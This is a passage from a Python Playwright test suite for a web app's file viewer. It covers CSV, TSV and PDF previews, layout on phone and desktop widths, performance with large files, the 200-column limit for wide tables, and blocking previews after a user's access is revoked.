                    expect(formula).to_be_visible()
                    expect(table.get_by_role("cell", name="@SUM(1+1)")).to_be_visible()
                    expect(table.get_by_role("cell", name="-2+3")).to_be_visible()
                    expect(table.get_by_role("link")).to_have_count(0)
                    expect(dialog.get_by_role("status")).to_have_text("4 rows")
                    # A wide table scrolls inside its sheet: the viewer keeps the screen's width.
                    self.assertLessEqual(page.evaluate("document.querySelector('.file-viewer').scrollWidth"), page.viewport_size["width"])
                    self.assertLessEqual(dialog.locator(".photo-viewer__top").bounding_box()["width"], page.viewport_size["width"])
                    self.shot(page, f"file-preview-csv-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    self.assertEqual(outside, [])
        page, _, _ = self.open("tsv")
        _, dialog = self.viewer(page, "tsv", "range.tsv")
        table = dialog.get_by_role("table", name="Contents of range.tsv")
        expect(table.get_by_role("columnheader")).to_have_text(["bed", "rssi"])
        expect(table.get_by_role("cell", name="-112")).to_be_visible()

    def test_09_a_pdf_opens_in_the_browsers_viewer_or_says_it_cannot(self) -> None:
        page, outside, _ = self.open("pdf")
        _, dialog = self.viewer(page, "pdf", "placement.pdf")
        if page.evaluate("navigator.pdfViewerEnabled"):
            frame = dialog.locator("iframe")
            expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:pdf']}/preview")
            self.assertIsNone(frame.get_attribute("sandbox"), "sandboxed by the preview's own policy (C-60)")
        else:
            # Playwright's headless Chromium shell has no PDF viewer: the viewer says so and offers Download.
            expect(dialog.get_by_text("This browser can't show a PDF here.")).to_be_visible()
            expect(dialog.locator(".file-viewer__sheet").get_by_role("link", name="Download")).to_have_attribute("download", "placement.pdf")
            self.shot(page, "file-preview-pdf-unsupported-1440-light")
        self.assertEqual(outside, [])

    @unittest.skipUnless(UI_BROWSER == "chromium", "the full Chromium build carries the PDF viewer")
    def test_10_chromium_shows_the_pdf_in_its_viewer_inside_the_sandboxed_frame(self) -> None:
        full = self.pw.chromium.launch(channel="chromium")
        self.addCleanup(full.close)
        context = full.new_context(base_url=ORIGIN, storage_state=self.states["jonas"], viewport=DESKTOP, service_workers="block")
        self.addCleanup(context.close)
        page = context.new_page()
        page.goto(f"/projects/{self.ids['project']}")
        page.locator(f"#message-{self.ids['pdf']}").scroll_into_view_if_needed()
        _, dialog = self.viewer(page, "pdf", "placement.pdf")
        expect(dialog.locator("iframe")).to_have_attribute("src", f"/api/v1/files/{self.ids['file:pdf']}/preview")
        deadline = time.time() + 15
        while time.time() < deadline and not any(f.url.startswith("chrome-extension://") for f in page.frames):
            page.wait_for_timeout(250)
        self.assertTrue(any(f.url.startswith("chrome-extension://") for f in page.frames), [f.url for f in page.frames])
        self.shot(page, "file-preview-pdf-1440-light")

    @unittest.skipUnless(UI_BROWSER == "chromium", "long tasks are measured in Chromium")
    def test_11_five_mib_files_open_without_holding_the_page(self) -> None:
        """A 5 MiB log, CSV (about 100,000 rows, scrolled to its last row) and JSON: no main-thread task over 200 ms."""
        for key, name in (("big-log", "uplinks.log"), ("big-csv", "uplinks.csv"), ("big-json", "uplinks.json")):
            with self.subTest(file=name):
                page, _, _ = self.open(key)
                page.evaluate("() => { window.__long = []; new PerformanceObserver((list) => { for (const e of list.getEntries()) window.__long.push(Math.round(e.duration)); }).observe({ type: 'longtask' }); }")
                started = time.time()
                _, dialog = self.viewer(page, key, name)
                if key == "big-csv":
                    table = dialog.get_by_role("table", name=f"Contents of {name}")
                    expect(table.get_by_role("columnheader").first).to_have_text("time", timeout=20000)
                    expect(dialog.get_by_role("status")).to_have_text(f"{BIG_CSV_ROWS:,} rows")
                    for _ in range(3):
                        table.evaluate("(el) => { el.scrollTop = el.scrollHeight; }")
                        page.wait_for_timeout(200)
                    last = BIG_CSV.rstrip(b"\n").rsplit(b"\n", 1)[1].decode().split(",")
                    row = table.locator(f"[role=row][aria-rowindex='{BIG_CSV_ROWS + 1}']")
                    expect(row).to_be_visible()
                    expect(row.get_by_role("cell").first).to_have_text(last[0])
                    expect(table.get_by_role("columnheader").first).to_be_in_viewport()
                    self.assertLess(table.locator("[role=row]").count(), 200, "only the rows in view are in the page")
                else:
                    region = self.contents(dialog, name)
                    expect(region.locator(".file-viewer__line").first).to_be_visible(timeout=20000)
                    region.evaluate("(el) => { el.scrollTop = el.scrollHeight / 2; }")
                    page.wait_for_timeout(300)
                    self.assertLess(region.locator(".file-viewer__line").count(), 400, "only the lines in view are in the page")
                ready = time.time() - started
                page.wait_for_timeout(300)
                long = page.evaluate("window.__long")
                print(f"{name}: ready in {ready:.2f} s, long tasks {long}")
                self.assertTrue(all(duration <= 200 for duration in long), f"{name}: long tasks {long}")
                self.shot(page, f"file-preview-{key}-1440-light")
        # A table as wide as a file allows draws its first 200 columns and says so: no column holds the page either.
        for key, name, columns in (("commas", "commas.csv", len(COMMAS) + 1), ("wide", "matrix.csv", 2000)):
            with self.subTest(file=name):
                page, _, _ = self.open(key)
                page.evaluate("() => { window.__long = []; new PerformanceObserver((list) => { for (const e of list.getEntries()) window.__long.push(Math.round(e.duration)); }).observe({ type: 'longtask' }); }")
                started = time.time()
                _, dialog = self.viewer(page, key, name)
                table = dialog.get_by_role("table", name=f"Contents of {name}")
                expect(table.get_by_role("columnheader")).to_have_count(200, timeout=30000)
                expect(table).to_have_attribute("aria-colcount", str(columns))
                expect(dialog.get_by_role("status")).to_contain_text(f"Showing the first 200 of {columns:,} columns. Download to see them all.")
                table.evaluate("(el) => { el.scrollLeft = el.scrollWidth; el.scrollTop = el.scrollHeight; }")
                page.wait_for_timeout(500)
                self.assertLess(table.locator("[role=cell], [role=columnheader]").count(), 200 * 120)
                long = page.evaluate("window.__long")
                print(f"{name}: ready in {time.time() - started:.2f} s, long tasks {long}")
                self.assertTrue(all(duration <= 200 for duration in long), f"{name}: long tasks {long}")

    def test_99_a_reader_who_lost_access_sees_nothing(self) -> None:
        page, outside, _ = self.open("report", quiet_stream=True)
        message = page.locator(f"#message-{self.ids['report']}")
        context = self.browser.new_context(base_url=ORIGIN, storage_state=self.states["ada"], service_workers="block")
        self.addCleanup(context.close)
        removed = context.request.delete(f"/api/v1/projects/{self.ids['project']}/grants/{self.ids['grant']}", headers={"origin": ORIGIN})
        self.assertEqual(removed.status, 204, removed.text())
        self.addCleanup(lambda: context.request.post(f"/api/v1/projects/{self.ids['project']}/grants", headers={"origin": ORIGIN},
                                                     data={"principal": {"kind": "human", "id": self.ids["jonas"]}, "role": "contributor"}))
        message.get_by_role("button", name="Preview range-report.html").click()
        dialog = page.get_by_role("dialog", name="range-report.html")
        expect(dialog.get_by_role("alert")).to_have_text("You no longer have access to this file.")
        expect(dialog.locator("iframe")).to_have_count(0)
        self.assertEqual(outside, [])


if __name__ == "__main__":
    unittest.main()
